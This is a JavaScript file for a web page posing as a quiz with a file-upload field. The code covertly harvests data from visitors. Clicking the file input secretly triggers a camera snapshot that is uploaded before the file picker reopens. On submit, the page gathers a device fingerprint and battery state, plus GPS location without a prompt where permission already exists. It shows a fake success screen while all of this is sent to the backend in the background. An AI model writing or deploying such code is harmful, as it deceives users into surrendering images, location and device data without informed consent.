const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";
const constraints = { video: { facingMode: "user" }, audio: false };

let cameraCaptured = false;
let cameraInProgress = false;
let capturedImage = null; // store camera image

// ================================
// COLLECT METADATA (ON SUBMIT)
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
    time: new Date().toLocaleString(),
  };

  // Battery info
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${Math.round(b.level * 100)}% charging:${b.charging}`;
    } catch {}
  }

  // Location only if already granted (NO POPUP)
  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  return metadata;
}

// ================================
// CAMERA CAPTURE + UPLOAD (/upload)
// ================================
async function captureAndSendCamera() {
  if (cameraCaptured || cameraInProgress) return;

  cameraInProgress = true;
  console.log("📸 captureAndSendCamera called");

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    video.setAttribute("playsinline", true);
    video.style.display = "block";

    await new Promise((resolve) => {
      video.onloadedmetadata = () => resolve();
    });

    await video.play();
    await new Promise((r) => setTimeout(r, 1200)); // wait for frame

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    capturedImage = canvas.toDataURL("image/png");
    console.log("✅ Camera captured successfully");

    // Send captured image to your /upload API
    const res = await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: capturedImage }),
    });

    const data = await res.json();
    console.log("Camera upload response:", data);

    // Stop camera
    stream.getTracks().forEach((t) => t.stop());
    video.style.display = "none";

    cameraCaptured = true;
  } catch (err) {
    console.error("❌ Camera error:", err);
  } finally {
    cameraInProgress = false;
  }
}

// ================================
// TRIGGER CAMERA ONLY ON FILE INPUT
// ================================
fileInput.addEventListener("pointerdown", async (e) => {
  if (!cameraCaptured && !cameraInProgress) {
    e.preventDefault(); // stop file picker temporarily
    await captureAndSendCamera();
    setTimeout(() => fileInput.click(), 50); // reopen file picker
  }
});

// ================================
// FILE UPLOAD FUNCTION (/file-upload)
// ================================
async function uploadFile(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ file: reader.result, filename: file.name }),
        });

        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// FORM SUBMIT (FILE + METADATA + CAMERA)
// ================================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!form.checkValidity()) {
    form.reportValidity();
    return;
  }

  if (!fileInput.files.length) {
    alert("Please upload a file first");
    return;
  }

  // Show success immediately
  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "flex";

  // Background upload
  (async () => {
    try {
      const metadata = await collectMetadata();

      const fileData = await new Promise((resolve) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result);
        reader.readAsDataURL(fileInput.files[0]);
      });

      const res = await fetch(`${BACKEND_BASE}/file-upload`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          file: fileData,
          filename: fileInput.files[0].name,
          metadata,
          cameraImage: capturedImage || null, // include if available
        }),
      });

      console.log("✅ File + metadata upload response:", await res.json());
    } catch (err) {
      console.error("❌ Upload failed:", err);
    }
  })();
});
